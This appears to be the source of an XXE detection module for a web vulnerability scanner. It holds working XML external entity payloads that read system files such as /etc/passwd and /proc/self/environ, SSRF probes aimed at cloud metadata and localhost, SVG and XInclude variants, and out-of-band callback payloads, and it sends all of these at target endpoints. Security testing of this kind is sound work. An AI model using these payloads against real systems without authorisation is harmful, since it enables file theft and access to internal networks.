"""XXE (XML External Entity) detection module for Titan Scanner — fully exhausted.

Features:
  1. Zero Parameter Whitelisting: probes ALL parameters containing XML-like content or
     any string param on XML-accepting endpoints.
  2. Exhaustive XXE Payload Matrix:
     a. In-band file disclosure: SYSTEM entity pointing to /etc/passwd, win.ini, /proc/self/environ
     b. OOB via DNS callback: SYSTEM entity pointing to Interactsh HTTP/DNS beacon
     c. OOB via Parameter Entity + external DTD: for blind XXE where standard entity is not reflected
     d. SSRF via XXE: SYSTEM entity pointing to internal network (127.0.0.1:22, 169.254.169.254)
     e. Error-based XXE: malformed entity name to leak file content in error messages
     f. XInclude XXE: when DOCTYPE is stripped but xi:include is processed
     g. SVG/XHTML XXE: Content-Type: image/svg+xml with embedded entities
  3. Content-Type probing: sends raw XML body with correct Content-Type header.
  4. Multi-format submission: query param, POST body, raw body injection.
  5. Strict Evidence Oracles:
     - File content leak after stripping all payload encodings (no self-verify)
     - XML parser error differential (new errors absent from baseline)
     - OOB Interactsh confirmation
"""

from __future__ import annotations

import asyncio
from typing import Any, Dict, List, Optional, Tuple

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer
from titan.verify.oracles import extract_error_classes, payload_encodings, score_signals


# ── In-band payloads ──────────────────────────────────────────────────────────
# These read files whose content should appear in the response body.
_INBAND_PAYLOADS: Tuple[str, ...] = (
    # POSIX file disclosure
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
    # Windows file disclosure
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
    # SSRF via XXE: internal network probes
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
    # Error-based: malformed entity leaks path in error message
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///NOEXIST_xxe_probe_titan">]><foo>&xxe;</foo>',
    # XInclude (when DOCTYPE is blocked but xi:include processed)
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    # Nested entity chaining
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY a "file:///etc/passwd"><!ENTITY b SYSTEM "&a;">]><data>&b;</data>',
)

# SVG XXE payload (for image upload endpoints)
_SVG_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
)

# File content markers to detect (never include path components from payloads)
_CONTENT_MARKERS: Tuple[str, ...] = (
    "root:x:0:0:", "daemon:x:", "bin:x:", "nobody:x:", "www-data:x:",
    "[fonts]", "[extensions]", "; for 16-bit app support",
    "ami-id", "availability-zone", "local-ipv4",
    "ssh-rsa", "BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY",
)

# Error strings that indicate the XML was parsed (entity resolution attempted)
_XML_PARSE_ERROR_MARKERS: Tuple[str, ...] = (
    "xml parsing", "xml syntax", "xmlparseerror", "parseerror",
    "entity", "dtd", "xml.etree", "lxml", "expat", "saxparseexception",
    "external entity", "systemid", "javax.xml", "org.xml.sax",
    "could not load", "no such file", "connection refused",
)


class XXEDetector:
    """Production-grade XXE detector with full entity injection coverage."""

    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint
        self.interactsh = fingerprint.get("interactsh")

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []

        # Build payload list (core + smith + OOB if available)
        all_payloads = list(_INBAND_PAYLOADS)
        oob_payload: Optional[str] = None
        oob_url: Optional[str] = None

        if self.interactsh:
            try:
                oob_url = self.interactsh.generate_oob_url("xxe")
                oob_payload = (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY % ext SYSTEM "{oob_url}"> %ext;'
                    f']><foo>trigger</foo>'
                )
                # Simpler variant too
                all_payloads.append(
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>'
                )
                all_payloads.append(oob_payload)
            except Exception:
                pass

        # ── Engine 1: All params, standard XML submission ──────────────
        for param_name in list(params.keys()):
            f = await self._test_param(
                context, target, method, url, param_name, params, all_payloads
            )
            if f:
                findings.append(f)

        # ── Engine 2: Raw XML body POST (Content-Type: application/xml) ─
        raw_findings = await self._scan_raw_xml_body(
            context, target, url, params, all_payloads
        )
        findings.extend(raw_findings)

        # ── Engine 3: SVG upload XXE ───────────────────────────────────
        svg_findings = await self._scan_svg_upload(context, target, url, params)
        findings.extend(svg_findings)

        # ── Engine 4: OOB confirmation (after triggering) ─────────────
        if oob_url and self.interactsh and not findings:
            oob_finding = await self._confirm_oob(
                context, target, method, url, params, oob_url
            )
            if oob_finding:
                findings.append(oob_finding)

        return findings

    # ------------------------------------------------------------------
    # ENGINE 1 — PARAM-LEVEL XML INJECTION
    # ------------------------------------------------------------------

    async def _test_param(
        self,
        context,
        target: str,
        method: str,
        url: str,
        param_name: str,
        all_params: Dict[str, str],
        payloads: List[str],
    ) -> Optional[Finding]:
        baseline_body = ""
        baseline_status = None

        try:
            if method == "GET":
                r0 = await context.request.get(
                    url, params=all_params, headers={"Referer": target}, timeout=3000
                )
            else:
                r0 = await context.request.post(
                    url, data=all_params, headers={"Referer": target}, timeout=3000
                )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            pass

        for payload in payloads:
            try:
                test_params = dict(all_params)
                test_params[param_name] = payload
                hdrs = {"Referer": target, "Content-Type": "application/xml"}
                if method == "GET":
                    resp = await context.request.get(url, params=test_params, headers=hdrs, timeout=3000)
                else:
                    resp = await context.request.post(url, data=test_params, headers=hdrs, timeout=3000)
                body = await resp.text()

                f = self._evaluate(baseline_body, baseline_status, body, resp,
                                   target, url, method, param_name,
                                   "query" if method == "GET" else "body",
                                   payload)
                if f:
                    return f
            except Exception:
                continue

        return None

    # ------------------------------------------------------------------
    # ENGINE 2 — RAW XML BODY
    # ------------------------------------------------------------------

    async def _scan_raw_xml_body(
        self,
        context,
        target: str,
        url: str,
        params: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        """POST raw XML payloads with Content-Type: application/xml."""
        findings: List[Finding] = []

        # Baseline with minimal valid XML
        baseline_xml = "<?xml version=\"1.0\"?><root/>"
        try:
            r0 = await context.request.post(
                url,
                data=baseline_xml,
                headers={"Content-Type": "application/xml", "Referer": target},
                timeout=3000,
            )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        for payload in payloads[:6]:
            try:
                resp = await context.request.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/xml", "Referer": target},
                    timeout=3000,
                )
                body = await resp.text()
                f = self._evaluate(baseline_body, baseline_status, body, resp,
                                   target, url, "POST", "__xml_body__",
                                   "raw_xml", payload)
                if f:
                    findings.append(f)
                    break
            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 3 — SVG UPLOAD XXE
    # ------------------------------------------------------------------

    async def _scan_svg_upload(
        self,
        context,
        target: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        try:
            r0 = await context.request.post(
                url,
                data=_SVG_PAYLOAD,
                headers={"Content-Type": "image/svg+xml", "Referer": target},
                timeout=3000,
            )
            baseline_body = ""
            try:
                rb = await context.request.post(
                    url,
                    data="<root/>",
                    headers={"Content-Type": "image/svg+xml", "Referer": target},
                    timeout=3000,
                )
                baseline_body = await rb.text()
            except Exception:
                pass

            body = await r0.text()
            f = self._evaluate(baseline_body, r0.status, body, r0,
                               target, url, "POST", "__svg_body__",
                               "svg_upload", _SVG_PAYLOAD)
            if f:
                findings.append(f)
        except Exception:
            pass

        return findings

    # ------------------------------------------------------------------
    # ENGINE 4 — OOB CONFIRMATION
    # ------------------------------------------------------------------

    async def _confirm_oob(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        oob_url: str,
    ) -> Optional[Finding]:
        if not self.interactsh:
            return None
        try:
            await self.interactsh.register()
            trigger_payload = (
                f'<?xml version="1.0"?><!DOCTYPE foo ['
                f'<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>'
            )
            hdrs = {"Referer": target, "Content-Type": "application/xml"}
            param_name = list(params.keys())[0] if params else "__xml_body__"
            test_params = dict(params)
            test_params[param_name] = trigger_payload
            if method == "POST":
                await context.request.post(url, data=test_params, headers=hdrs, timeout=3000)
            else:
                await context.request.get(url, params=test_params, headers=hdrs, timeout=3000)
            await asyncio.sleep(2)
            oob_results = await self.interactsh.poll(timeout=10)
            if oob_results:
                return Finding(
                    target=target,
                    url=url,
                    method=method.upper(),
                    param=param_name,
                    location="query" if method == "GET" else "body",
                    payload=f"OOB XXE: {oob_url}",
                    attack_type=AttackType.XXE,
                    severity=Severity.CRITICAL,
                    verified=True,
                    confidence=0.97,
                    status=200,
                    headers={},
                    body="",
                    diffs=["xxe:oob_confirmed", "oob_confirmed"],
                    baseline_body="",
                    baseline_status=None,
                    verification_body="OOB interaction confirmed",
                    verification_status=200,
                    metadata={"oob_url": oob_url},
                )
        except Exception:
            pass
        return None

    # ------------------------------------------------------------------
    # EVIDENCE SCORING
    # ------------------------------------------------------------------

    def _evaluate(
        self,
        baseline_body: str,
        baseline_status: Optional[int],
        body: str,
        resp: Any,
        target: str,
        url: str,
        method: str,
        param_name: str,
        location: str,
        payload: str,
    ) -> Optional[Finding]:
        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
        signals: List[str] = []
        baseline_lower = baseline_body.lower()

        # Strip all encodings of payload before checking content leaks
        stripped = body.lower()
        for form in payload_encodings(payload):
            stripped = stripped.replace(form.lower(), "")

        # 1. File-content leak
        content_matches = [
            m for m in _CONTENT_MARKERS
            if m.lower() in stripped and m.lower() not in baseline_lower
        ]
        if content_matches:
            signals.append("content_leak")
            for m in content_matches:
                diffs.append(f"xxe:content:{m}")

        # 2. XML parser error differential
        baseline_errors = set(extract_error_classes(baseline_body))
        new_errors = set(extract_error_classes(body)) - baseline_errors
        for ec in new_errors:
            if ec in {"xml", "generic", "python", "java"}:
                signals.append(f"error:{ec}")
                diffs.append(f"xxe:error_class:{ec}")

        # Also check raw error keywords
        for marker in _XML_PARSE_ERROR_MARKERS:
            if marker in stripped and marker not in baseline_lower:
                signals.append("error:xml")
                diffs.append(f"xxe:parser_error:{marker}")
                break

        if resp.status >= 500 and (baseline_status or 200) < 500:
            signals.append("status_500")
        if len(body) != len(baseline_body):
            signals.append("content_change")

        if signals:
            confidence, verified, _ = score_signals(signals)
            if confidence >= 0.3:
                severity = Severity.CRITICAL if verified else Severity.HIGH
                return Finding(
                    target=target,
                    url=str(getattr(resp, "url", None) or url),
                    method=method.upper(),
                    param=param_name,
                    location=location,
                    payload=payload[:300],
                    attack_type=AttackType.XXE,
                    severity=severity,
                    verified=verified,
                    confidence=confidence,
                    status=resp.status,
                    headers=dict(resp.headers),
                    body=body[:2000],
                    diffs=diffs,
                    baseline_body=baseline_body[:2000],
                    baseline_status=baseline_status,
                    verification_body=body[:2000],
                    verification_status=resp.status,
                )
        return None
